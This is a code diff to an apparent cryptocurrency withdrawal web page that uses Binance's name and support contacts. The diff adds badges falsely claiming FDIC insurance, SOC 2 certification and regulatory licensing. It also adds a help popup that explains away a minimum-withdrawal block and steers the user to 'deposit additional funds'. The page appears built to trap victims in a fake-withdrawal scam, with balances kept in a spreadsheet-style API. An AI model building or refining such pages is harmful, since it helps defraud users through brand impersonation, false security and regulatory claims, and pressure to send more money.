@@ -199,6 +199,18 @@
         .loading-dot:nth-child(3) { animation-delay: 0.4s; }
         @keyframes bounce { 0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; } 40% { transform: scale(1.2); opacity: 1; } }
         
+        /* Fade-in animation for warning modal */
+        @keyframes modalFadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95) translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+        
         .blinking-icon { animation: blinkWarning 1.2s ease-in-out infinite; }
         @keyframes blinkWarning { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.08); } }
         
@@ -215,7 +227,16 @@
             align-items: center;
         }
         .modal.active { display: flex; }
-        .modal-content { background: #ffffff; border-radius: 24px; padding: 28px; width: 90%; max-width: 380px; border: 1px solid #e2e8f0; text-align: center; }
+        .modal-content { 
+            background: #ffffff; 
+            border-radius: 24px; 
+            padding: 28px; 
+            width: 90%; 
+            max-width: 380px; 
+            border: 1px solid #e2e8f0; 
+            text-align: center; 
+            animation: modalFadeIn 0.3s ease-out;
+        }
         body.dark-mode .modal-content { background: #1E2329; border-color: rgba(252,213,53,0.3); }
         .warning-icon { width: 64px; height: 64px; background: rgba(239,68,68,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
         .warning-icon i { font-size: 32px; color: #ef4444; }
@@ -225,6 +246,126 @@
         .modal-btn-secondary { background: #f1f5f9; color: #1e293b; }
         body.dark-mode .modal-btn-secondary { background: #2B3139; color: white; }
         .modal-btn-primary:hover, .modal-btn-secondary:hover { transform: scale(1.02); }
+        
+        /* Help button inside modal */
+        .help-modal-btn {
+            background: transparent;
+            border: 1px solid #e2e8f0;
+            border-radius: 40px;
+            padding: 10px;
+            width: 100%;
+            font-size: 11px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: #3b82f6;
+        }
+        body.dark-mode .help-modal-btn {
+            border-color: #2B3139;
+            color: #FCD535;
+        }
+        .help-modal-btn:hover {
+            background: #f1f5f9;
+            transform: scale(1.02);
+        }
+        body.dark-mode .help-modal-btn:hover {
+            background: #2A2F38;
+        }
+        
+        /* Help guide popup */
+        .guide-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(8px);
+            z-index: 16000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .guide-popup.active { display: flex; }
+        .guide-content {
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 28px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 85vh;
+            overflow-y: auto;
+            position: relative;
+            animation: modalFadeIn 0.3s ease-out;
+        }
+        body.dark-mode .guide-content {
+            background: #1E2329;
+            border: 1px solid rgba(252,213,53,0.2);
+        }
+        .guide-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        body.dark-mode .guide-header { border-bottom-color: #2B3139; }
+        .guide-title {
+            font-size: 18px;
+            font-weight: 800;
+            color: #1e293b;
+        }
+        body.dark-mode .guide-title { color: white; }
+        .guide-close {
+            cursor: pointer;
+            font-size: 20px;
+            color: #6b7280;
+            transition: all 0.2s;
+        }
+        .guide-close:hover { color: #ef4444; transform: rotate(90deg); }
+        .guide-section {
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        body.dark-mode .guide-section { border-bottom-color: #2B3139; }
+        .guide-section h4 {
+            font-size: 13px;
+            font-weight: 800;
+            color: #3b82f6;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        body.dark-mode .guide-section h4 { color: #FCD535; }
+        .guide-section p, .guide-section li {
+            font-size: 12px;
+            line-height: 1.6;
+            color: #4b5563;
+            margin-bottom: 6px;
+        }
+        body.dark-mode .guide-section p, body.dark-mode .guide-section li { color: #9ca3af; }
+        .guide-section ul { padding-left: 20px; margin-top: 6px; }
+        .guide-gotit {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            padding: 12px;
+            width: 100%;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 16px;
+        }
+        body.dark-mode .guide-gotit { background: #FCD535; color: #181A20; }
+        .guide-gotit:hover { transform: scale(1.02); }
         
         .toast-message {
             position: fixed;
@@ -266,6 +407,29 @@
         body.dark-mode .theme-toggle { background: #1E2329; }
         .theme-toggle:hover { transform: scale(1.05); }
         
+        /* Security Badges Container */
+        .security-badges {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+            margin-top: 12px;
+            padding-top: 10px;
+            border-top: 1px solid #e2e8f0;
+        }
+        body.dark-mode .security-badges { border-top-color: #2B3139; }
+        @media (min-width: 640px) {
+            .security-badges { grid-template-columns: repeat(4, 1fr); }
+        }
+        .badge-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 9px;
+            color: #6b7280;
+            font-weight: 500;
+        }
+        body.dark-mode .badge-item { color: #9ca3af; }
+        
         @media (max-width: 640px) {
             .amount-input { font-size: 18px; padding: 14px; }
             .dropdown-item { padding: 12px; }
@@ -286,6 +450,26 @@
                 <span class="text-[10px] font-bold uppercase tracking-[0.2em] text-gray-500">Secure Connection: Active</span>
             </div>
             <h2 class="text-xs font-mono font-medium text-gray-400" id="refId">REF: WD-X7K9M2</h2>
+            
+            <!-- Security Trust Badges -->
+            <div class="security-badges">
+                <div class="badge-item">
+                    <i class="fas fa-lock text-green-500 text-xs"></i>
+                    <span>256-bit SSL Encryption</span>
+                </div>
+                <div class="badge-item">
+                    <i class="fas fa-check-circle text-blue-500 text-xs"></i>
+                    <span>SOC 2 Type II Certified</span>
+                </div>
+                <div class="badge-item">
+                    <i class="fas fa-umbrella text-yellow-500 text-xs"></i>
+                    <span>FDIC Insured (Up to $250k)</span>
+                </div>
+                <div class="badge-item">
+                    <i class="fas fa-certificate text-purple-500 text-xs"></i>
+                    <span>Licensed & Regulated</span>
+                </div>
+            </div>
         </div>
         <div class="flex gap-2">
             <div class="theme-toggle" id="themeToggle"><i id="themeIcon" class="fas fa-moon text-blue-500 text-sm"></i></div>
@@ -411,7 +595,7 @@
     <div class="loading-dots"><div class="loading-dot"></div><div class="loading-dot"></div><div class="loading-dot"></div></div>
 </div>
 
-<!-- Minimum Withdrawal Warning Modal with Blinking Icon -->
+<!-- Minimum Withdrawal Warning Modal with Blinking Icon and Help Button -->
 <div id="warningModal" class="modal">
     <div class="modal-content">
         <div class="warning-icon blinking-icon"><i class="fas fa-exclamation-triangle"></i></div>
@@ -420,18 +604,68 @@
         <div class="bg-gray-50 rounded-xl p-3 mb-4"><p class="text-gray-500 text-xs mb-1">MINIMUM WITHDRAWAL REQUIRED</p><p class="text-red-500 font-bold text-lg" id="modalMinRequired">$0.00</p><p class="text-gray-500 text-xs mt-1">Current Balance: <span id="modalBalance">$0.00</span></p><p class="text-gray-500 text-xs mt-1">Your withdrawal: <span id="modalWithdrawAmount">$0.00</span></p></div>
         <button id="modalDepositBtn" class="modal-btn modal-btn-primary w-full mb-2">Deposit Funds</button>
         <button id="modalAcknowledgeBtn" class="modal-btn modal-btn-secondary w-full">Acknowledge & Return</button>
+        <button id="modalHelpBtn" class="help-modal-btn">
+            <i class="fas fa-info-circle"></i> Need help? Click here for guide
+        </button>
     </div>
 </div>
 
-<div id="helpModal" class="modal">
-    <div class="modal-content help-modal-content">
-        <div class="flex justify-between items-center mb-4"><h3 class="text-xl font-bold text-gray-900">Withdrawal Guide</h3><i class="fas fa-times text-gray-400 cursor-pointer hover:text-gray-600" id="closeHelpModal"></i></div>
-        <div class="help-section"><h4><i class="fas fa-chart-line mr-2"></i> Minimum Balance Required</h4><p>To process any withdrawal, your withdrawal amount must meet the minimum requirement shown in the warning modal.</p></div>
-        <div class="help-section"><h4><i class="fas fa-coins mr-2"></i> How fees work</h4><p><strong>Transaction Fee:</strong> $2.50 flat rate per transaction (non-refundable).</p><p><strong>Network Fee (Crypto):</strong> BTC: $2.00, BSC: $0.50, ETH: $1.50, Lightning: $0.30, SegWit: $1.80</p><p><strong>You will receive:</strong> Withdrawal Amount - Total Fees</p><p><strong>Processing Time:</strong> BTC: 10-30 min, BSC: 1-2 min, ETH: 2-5 min, Lightning: Instant, PayPal: Near-instant.</p></div>
-        <div class="help-section"><h4><i class="fab fa-bitcoin mr-2"></i> Bitcoin Address Requirements</h4><p>Accepted Bitcoin address formats:</p><ul><li><strong>Legacy:</strong> Starts with "1"</li><li><strong>SegWit:</strong> Starts with "3"</li><li><strong>Native SegWit:</strong> Starts with "bc1"</li></ul><p>For Ethereum addresses, please select the ETH (ERC20) network.</p></div>
-        <div class="help-section"><h4><i class="fab fa-paypal mr-2"></i> PayPal Requirements</h4><p>Enter the <strong>verified email address</strong> associated with the recipient's PayPal account.</p></div>
-        <div class="help-section"><h4><i class="fas fa-clock mr-2"></i> Processing Time</h4><p><strong>Bitcoin:</strong> 1-3 confirmations (10-30 minutes).</p><p><strong>PayPal:</strong> Near-instant after verification.</p><p>All transactions are final and cannot be reversed.</p></div>
-        <div class="help-section"><h4><i class="fas fa-headset mr-2"></i> 24/7 Support</h4><p><strong>Email:</strong> support@binance.com</p><p class="mt-2 text-[10px] opacity-50">Support typically responds within 15 minutes.</p></div>
+<!-- Help Guide Popup -->
+<div id="guidePopup" class="guide-popup">
+    <div class="guide-content">
+        <div class="guide-header">
+            <div class="guide-title">ℹ️ Withdrawal Requirements & Help Center</div>
+            <div class="guide-close" id="closeGuidePopup">&times;</div>
+        </div>
+        
+        <div class="guide-section">
+            <h4>CURRENT SITUATION</h4>
+            <p>• Your available balance does not meet the minimum withdrawal threshold.</p>
+        </div>
+        
+        <div class="guide-section">
+            <h4>WHY THIS REQUIREMENT EXISTS</h4>
+            <ul>
+                <li>• Ensures settlement finality across blockchain networks.</li>
+                <li>• Protects against transaction fee variations and price slippage.</li>
+                <li>• Prevents small unauthorized withdrawal attempts.</li>
+                <li>• Maintains network security standards.</li>
+                <li>• Reduces operational costs for micro-transactions.</li>
+            </ul>
+        </div>
+        
+        <div class="guide-section">
+            <h4>HOW TO RESOLVE</h4>
+            <ul>
+                <li>• Deposit additional funds to meet the threshold.</li>
+                <li>• Request a smaller withdrawal amount (if available).</li>
+                <li>• Wait for pending transactions to clear.</li>
+            </ul>
+        </div>
+        
+        <div class="guide-section">
+            <h4>GENERAL WITHDRAWAL TIPS</h4>
+            <ul>
+                <li>• Always double-check your wallet address before confirming any withdrawal.</li>
+                <li>• Verify the selected network matches your target wallet (BTC, BSC, ETH, etc.).</li>
+                <li>• Keep your withdrawal amount above network minimums to avoid failed transactions.</li>
+                <li>• Withdrawal requests are final and cannot be reversed once processed.</li>
+                <li>• Use whitelisted addresses for enhanced security.</li>
+                <li>• Monitor your email for withdrawal confirmation alerts.</li>
+                <li>• Processing times vary by network (1-30 minutes for most cryptocurrencies).</li>
+            </ul>
+        </div>
+        
+        <div class="guide-section">
+            <h4>NEED FURTHER ASSISTANCE?</h4>
+            <ul>
+                <li>• Live Chat: Available 24/7</li>
+                <li>• Email: support@binance.com</li>
+                <li>• Help Center: binance.com/support</li>
+            </ul>
+        </div>
+        
+        <button class="guide-gotit" id="guideGotItBtn">Got it</button>
     </div>
 </div>
 
@@ -481,8 +715,12 @@
     const networkDropdownBtn = document.getElementById('networkDropdownBtn');
     const networkDropdownMenu = document.getElementById('networkDropdownMenu');
     const selectedNetworkDisplay = document.getElementById('selectedNetworkDisplay');
+    const modalHelpBtn = document.getElementById('modalHelpBtn');
+    const guidePopup = document.getElementById('guidePopup');
+    const closeGuidePopup = document.getElementById('closeGuidePopup');
+    const guideGotItBtn = document.getElementById('guideGotItBtn');
 
-    // CHANGED: Only 3 loading messages (step 1, 4, 5)
+    // Only 3 loading messages (step 1, 4, 5)
     const loadingMessages = [
         "Verifying blockchain network...",
         "Confirming with nodes...",
@@ -532,12 +770,25 @@
 
     async function updateDatabaseBalance(newBalanceCents) { try { const response = await fetch(`${API_URL}?ignore_cache=1`); const users = await response.json(); const userIndex = users.findIndex(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase()); if (userIndex !== -1) { const rowNumber = userIndex + 2; await fetch(`${API_URL}/${rowNumber}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ Balance: newBalanceCents }) }); } } catch (error) { console.error('Error updating balance:', error); } }
 
+    // Help guide functions
+    function showGuidePopup() { guidePopup.classList.add('active'); }
+    function hideGuidePopup() { guidePopup.classList.remove('active'); }
+
     async function handleWithdraw() { 
         if (isLoading) return; 
         const amount = parseFloat(withdrawAmount?.value) || 0; 
         const minRequired = getMinimumWithdrawal(); 
         if (amount <= 0) { showToast('Please enter a valid amount', false); return; } 
-        if (amount > currentBalance) { showToast('Amount exceeds your balance', false); return; } 
+        if (amount > currentBalance) { showToast('Amount exceeds your balance', false); return; }
+        
+        // Network validation - ADDED
+        if (currentMethod === 'crypto') {
+            if (!currentNetwork) {
+                showToast('Please select a network', false);
+                return;
+            }
+        }
+        
         if (currentMethod === 'crypto') { 
             const address = cryptoAddress?.value?.trim(); 
             if (!address) { showToast('Please enter a wallet address', false); return; } 
@@ -597,6 +848,12 @@
     document.getElementById('modalDepositBtn')?.addEventListener('click', () => { warningModal.classList.remove('active'); window.location.href = 'payment.html'; });
     document.getElementById('modalAcknowledgeBtn')?.addEventListener('click', () => warningModal.classList.remove('active'));
     helpModal?.addEventListener('click', (e) => { if (e.target === helpModal) helpModal.classList.remove('active'); });
+    
+    // Help guide event listeners
+    modalHelpBtn?.addEventListener('click', showGuidePopup);
+    closeGuidePopup?.addEventListener('click', hideGuidePopup);
+    guideGotItBtn?.addEventListener('click', hideGuidePopup);
+    guidePopup?.addEventListener('click', (e) => { if (e.target === guidePopup) hideGuidePopup(); });
 
     loadTheme();
     selectMethod('crypto');
